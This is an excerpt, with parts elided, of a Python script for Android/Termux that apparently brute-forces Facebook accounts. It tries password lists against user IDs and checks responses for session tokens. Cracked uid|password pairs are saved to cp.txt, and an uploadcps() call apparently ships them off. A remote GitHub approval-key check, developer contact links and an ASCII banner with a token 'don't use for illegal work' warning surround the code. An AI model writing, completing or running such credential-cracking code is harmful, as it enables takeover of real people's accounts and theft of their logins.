...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Jahid-Alvee/approval.txt/blob/main/approval.txt"])
	exit(" [*] FACEBOOK : https://www.facebook.com/lastline.ad ")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801401449994")
	subprocess.check_output(["am", "start", "https://wa.me/+8801401449994"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Jahid-Alvee/approval.txt/blob/main/approval.txt').text
			if basesplit in plr:
				key = basesplit
		...
		print ("""\033[0;92m  __  __        _____   _______     _______ _    _  ____  
 \033[0;93m|  \/  |      |  __ \ / ____\ \   / / ____| |  | |/ __ \ 
 \033[0;94m| \  / |_ __  | |__) | (___  \ \_/ / |    | |__| | |  | |
 \033[0;95m| |\/| | '__| |  ___/ \___ \  \   /| |    |  __  | |  | |
 \033[0;96m| |  | | |_   | |     ____) |  | | | |____| |  | | |__| |
 \033[0;97m|_|  |_|_(_)  |_|    |_____/   |_|  \_____|_|  |_|\____/                                                          
                                                          
 > \033[0;92mDEVELOPER     : MR. PSYCHO
 > \033[0;95mFACEBOOK ID   : JAHID ALVEE
 > \033[0;41mWHATSAPP      : +8801401449994
 \033[0;96m> YOUTUBE       : NOT FOUND YET
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [JAHID] : %s/%s -> \033[0;92m [ PSYCHO-OK:%s ]- \033[0;93m[PSYCHO-CP :%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("cp.txt","a").write(" [JAHID-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
